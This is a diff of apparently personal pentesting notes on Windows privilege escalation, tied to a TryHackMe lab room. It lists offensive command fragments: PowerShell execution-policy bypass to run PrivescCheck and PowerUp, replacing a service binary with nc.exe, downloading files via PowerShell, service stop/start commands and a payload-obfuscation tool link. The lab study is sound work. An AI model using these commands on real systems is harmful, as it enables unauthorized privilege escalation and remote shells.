@@ -75,12 +75,6 @@ int main() {
 
 ## Overconfidence
 
---- https://tryhackme.com/room/steelmountain ⭐
-
-* use meterpreter upload to upload the winPEAS
-* `upload /tmp/xxx`
-* `shell`
-* `.\winPEASany_ofs.exe`
 * `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"`
 * `powershell -ep bypass -c ". .\PowerUp.ps1;"`
 * `https://github.com/itm4n/PrivescCheck#metasploit-timeout`
@@ -90,10 +84,7 @@ int main() {
 * `. .\PowerUp.ps1` `PS > Invoke-AllChecks`
 * https://www.joesandbox.com/#windows
 * https://github.com/EgeBalci/sgn
-* sc qc XXX
-* sc stop XXX
 * `Write-ServiceBinary -Name 'XXX' -Path ".\nc.exe"`
-* sc start XXX
 * `powershell -c wget "URL" -outfile "OUTPUT"`
 * like OTX: https://cyware.com/
 
